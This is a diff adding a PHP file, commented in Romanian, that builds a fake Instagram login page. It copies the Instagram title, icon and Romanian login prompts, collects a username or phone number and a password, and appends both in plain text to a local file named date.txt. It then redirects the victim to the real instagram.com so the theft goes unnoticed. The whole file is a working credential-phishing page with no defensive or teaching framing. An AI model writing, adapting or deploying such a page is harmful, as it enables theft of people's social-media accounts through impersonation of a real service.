@@ -1,0 +1,118 @@
+<?php
+// Verifică dacă scriptul este accesat prin metoda POST
+if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] == 'POST') {
+    // Preia datele trimise prin formular
+    $nume = $_POST['nume'] ?? 'Nedefinit'; // Operatorul ?? este folosit pentru a returna 'Nedefinit' dacă indexul 'nume' nu există
+    $parola = $_POST['parola'] ?? 'Nedefinit'; 
+
+    // Deschide sau creează fișierul 'date.txt' pentru a adăuga textul primit
+    $file = fopen("date.txt", "a"); // 'a' este modul pentru append, adaugă la sfârșitul fișierului
+
+    // Verifică dacă fișierul a fost deschis cu succes
+    if ($file === false) {
+        echo "Eroare la deschiderea fișierului!";
+    } else {
+        
+        fwrite($file, "Nume: $nume, Parola: $parola\n"); // Folosește variabilele $nume și $parola aici
+        fclose($file);
+
+        header('Location: https://www.instagram.com/');
+        exit; 
+    }
+} else {
+    // Dacă scriptul nu este accesat prin metoda POST, afișează un mesaj de eroare
+    echo "Această pagină trebuie accesată prin metoda POST.";
+
+?>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Conectare &#8226; Instagram</title>
+    <link rel="icon" href="https://c0.klipartz.com/pngpicture/16/46/gratis-png-instagram.png" type="image/png"> <!-- Adaugă un icon de la Instagram -->
+    <style>
+        body {
+            background-image: url('./Instagram4.PNG');
+            background-size: cover;
+            background-position: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+		.container{
+			margin-bottom: 20%;
+            margin-top: 15px;
+		}
+
+        .input-container {
+           margin-right: 10%;
+			margin-left: 15px;
+        }
+
+
+        .input1 {
+            width: 268px;
+            padding: 10px;
+            border: none;
+            border-radius: 2px;
+            margin: 3px;
+			margin-right: 20px;
+            margin-top: 27px;
+        }
+
+        .input2 {
+            width: 268px;
+            padding: 10px;
+            border: none;
+            border-radius: 2px;
+            margin: 3px;
+			margin-right: 20px;
+            margin-top: 40px;
+            margin-bottom: -20px;
+        }
+
+		.login-button {
+            background-color: #5194ed;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+            margin-left: 16px;
+            margin-top: 23px;
+            height: 33px;
+            width: 273px;
+            align-items: center;
+        }
+
+    </style>
+</head>
+<body>
+	<div class="container">
+        <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']);?>" method="post">
+    <div class="input-container">
+        <input class="input2" type="text" id="nume" name="nume" placeholder="Telefon, e-mail sau nume de utilizator">
+    </div>
+    <div class="input-container">
+        <input class="input1" id="parola" name="parola" type="password" placeholder="Parola">
+    </div>
+  <input type="submit" class="login-button"  value="Conectare">
+</form>
+    
+</div>
+
+</body>
+</html>
+
+<?php
+}
+?>
